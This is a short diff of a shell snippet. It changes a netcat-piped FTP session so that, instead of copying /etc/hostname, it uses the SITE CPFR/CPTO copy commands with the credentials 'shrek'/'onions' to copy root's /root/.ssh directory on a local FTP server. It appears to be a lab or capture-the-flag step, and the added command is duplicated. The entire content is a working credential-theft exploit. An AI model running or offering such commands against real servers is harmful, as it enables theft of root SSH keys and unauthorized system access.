@@ -1,2 +1,5 @@
-printf 'USER shrek\r\nPASS onions\r\nSITE CPFR /etc/hostname\r\nSITE CPTO /tmp/hostname-copy\r\nQUIT\r\n' \
+printf 'USER shrek\r\nPASS onions\r\nSITE CPFR /root/.ssh\r\nSITE CPTO rootssh\r\nQUIT\r\n' \
+| netcat -w 5 127.0.0.1 21
+
+printf 'USER shrek\r\nPASS onions\r\nSITE CPFR /root/.ssh\r\nSITE CPTO rootssh\r\nQUIT\r\n' \
 | netcat -w 5 127.0.0.1 21
